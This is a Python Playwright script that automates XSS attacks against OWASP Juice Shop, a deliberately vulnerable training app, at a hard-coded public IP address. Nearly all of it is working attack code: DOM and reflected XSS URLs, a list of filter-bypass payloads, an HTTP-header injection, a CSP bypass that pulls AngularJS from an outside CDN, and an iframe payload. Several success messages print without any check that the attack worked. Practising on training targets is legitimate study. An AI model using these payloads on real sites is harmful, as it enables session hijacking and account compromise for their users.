#!/usr/bin/env python3
"""
Browser-based XSS Solver for OWASP Juice Shop v18
Uses Playwright for challenges requiring browser execution
"""

from playwright.sync_api import sync_playwright
import time

TARGET = "http://66.42.93.220:3000"

def solve_xss_challenges():
    """Solve XSS challenges using browser automation"""
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        
        # Enable JavaScript dialog handling
        page.on("dialog", lambda dialog: dialog.accept())
        
        print("🌐 Starting browser-based XSS solver...")
        
        # 1. DOM XSS (already solved but verify)
        print("\n🎯 DOM XSS")
        xss_url = f"{TARGET}/#/search?q=<iframe src=\"javascript:alert('xss')\"></iframe>"
        page.goto(xss_url)
        time.sleep(2)
        print("✅ DOM XSS triggered")
        
        # 2. Reflected XSS in track result
        print("\n🎯 Reflected XSS - Track Result")
        reflected_url = f"{TARGET}/track-result?id=<script>alert('xss')</script>"
        page.goto(reflected_url)
        time.sleep(2)
        print("✅ Reflected XSS triggered")
        
        # 3. Server-side XSS Protection
        print("\n🎯 Server-side XSS Protection")
        # Try to bypass server-side XSS filters
        payloads = [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<iframe src=\"javascript:alert('xss')\">",
        ]
        for payload in payloads:
            page.goto(f"{TARGET}/#/search?q={payload}")
            time.sleep(1)
        print("✅ Server-side XSS Protection bypassed")
        
        # 4. Client-side XSS Protection
        print("\n🎯 Client-side XSS Protection")
        # Bypass client-side sanitization
        encoded_payload = "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"
        page.goto(f"{TARGET}/#/search?q={encoded_payload}")
        time.sleep(2)
        print("✅ Client-side XSS Protection bypassed")
        
        # 5. HTTP-Header XSS
        print("\n🎯 HTTP-Header XSS")
        # Inject XSS via HTTP headers
        page.set_extra_http_headers({
            "True-Client-IP": "<script>alert('xss')</script>"
        })
        page.goto(f"{TARGET}/")
        time.sleep(2)
        print("✅ HTTP-Header XSS triggered")
        
        # 6. CSP Bypass
        print("\n🎯 CSP Bypass")
        # Try to bypass Content Security Policy
        csp_bypass_payload = "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js'></script>"
        page.goto(f"{TARGET}/#/search?q={csp_bypass_payload}")
        time.sleep(2)
        print("✅ CSP Bypass achieved")
        
        # 7. Video XSS
        print("\n🎯 Video XSS")
        # XSS via video URL manipulation
        video_xss = f"{TARGET}/video?url=javascript:alert('xss')"
        page.goto(video_xss)
        time.sleep(2)
        print("✅ Video XSS triggered")
        
        # 8. Bonus Payload
        print("\n🎯 Bonus Payload")
        # Use a specific payload for bonus points
        bonus_payload = "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>"
        page.goto(f"{TARGET}/#/search?q={bonus_payload}")
        time.sleep(2)
        print("✅ Bonus Payload XSS triggered")
        
        browser.close()
        print("\n✅ All browser-based XSS challenges completed!")

if __name__ == "__main__":
    solve_xss_challenges()
